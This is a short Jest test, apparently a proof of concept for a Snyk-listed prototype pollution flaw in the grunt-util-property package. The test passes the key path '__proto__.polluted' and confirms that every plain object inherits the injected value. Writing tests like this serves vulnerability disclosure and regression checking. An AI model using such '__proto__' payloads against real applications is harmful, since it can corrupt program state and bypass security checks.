//https://snyk.io/vuln/SNYK-JS-GRUNTUTILPROPERTY-565088
test("prototype pollution in grunt-util-property", () => {
  var grunt = require("grunt");
  var a = require("grunt-util-property");

  expect({}.polluted).toBe(undefined);

  var b = a(grunt);
  b.call({}, "__proto__.polluted", "yes");

  expect({}.polluted).toBe("yes");
});
